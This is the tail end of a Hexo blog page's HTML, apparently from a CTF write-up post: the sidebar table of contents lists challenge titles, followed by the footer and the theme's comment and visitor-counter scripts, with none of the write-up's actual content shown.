+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/215.png"
+                alt="Veritas501" />
+            
+              <p class="site-author-name" itemprop="name">Veritas501</p>
+              <p class="site-description motion-element" itemprop="description">开始踏上Re&Pwn之路...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/veritas501" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://music.163.com/#/user/home?id=58295006" target="_blank" title="网易云"><i class="fa fa-fw fa-music"></i>网易云</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/xu-qt/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-quora"></i>知乎</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://osu.ppy.sh/users/9533614" target="_blank" title="OSU"><i class="fa fa-fw fa-headphones"></i>OSU</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#water-impossible-50"><span class="nav-number">1.1.</span> <span class="nav-text">water-impossible 50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#infant-gogogo-180"><span class="nav-number">1.2.</span> <span class="nav-text">infant-gogogo 180</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#infant-gotoheaven-255"><span class="nav-number">1.3.</span> <span class="nav-text">infant-gotoheaven 255</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MagicBook-455"><span class="nav-number">1.4.</span> <span class="nav-text">MagicBook 455</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#toddler-notakto-500"><span class="nav-number">1.5.</span> <span class="nav-text">toddler-notakto 500</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#programming"><span class="nav-number">2.</span> <span class="nav-text">programming</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reverse"><span class="nav-number">3.</span> <span class="nav-text">reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#little-asm-50"><span class="nav-number">3.1.</span> <span class="nav-text">little-asm 50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#little-asm-revenge-50"><span class="nav-number">3.2.</span> <span class="nav-text">little-asm-revenge 50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#little-asm-impossible-95"><span class="nav-number">3.3.</span> <span class="nav-text">little-asm-impossible 95</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">4.</span> <span class="nav-text">crypto</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#forensic"><span class="nav-number">5.</span> <span class="nav-text">forensic</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#net-packet-50"><span class="nav-number">5.1.</span> <span class="nav-text">net-packet 50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BambooFox-app-50"><span class="nav-number">5.2.</span> <span class="nav-text">BambooFox-app 50</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">6.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#suck-login-50"><span class="nav-number">6.1.</span> <span class="nav-text">suck-login 50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tiny-git-50"><span class="nav-number">6.2.</span> <span class="nav-text">tiny-git 50</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">7.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#suck-browser-50"><span class="nav-number">7.1.</span> <span class="nav-text">suck-browser 50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#suck-file-50"><span class="nav-number">7.2.</span> <span class="nav-text">suck-file 50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#suck-apple-50"><span class="nav-number">7.3.</span> <span class="nav-text">suck-apple 50</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Veritas501</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '5lMbuXdt5hbFRNKM5uaAC1xm-gzGzoHsz',
+        appKey: 'vA8ML592eyDDRr5tl4J9Eco3',
+        placeholder: '说点什么...',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("97qzbH6lJuabRg1KDY7DtJRS-gzGzoHsz", "GS8vVhMCaeXncQF8mQOIShBj");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            
+            counter.save(null, {
+              success: function(counter) {
+                
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
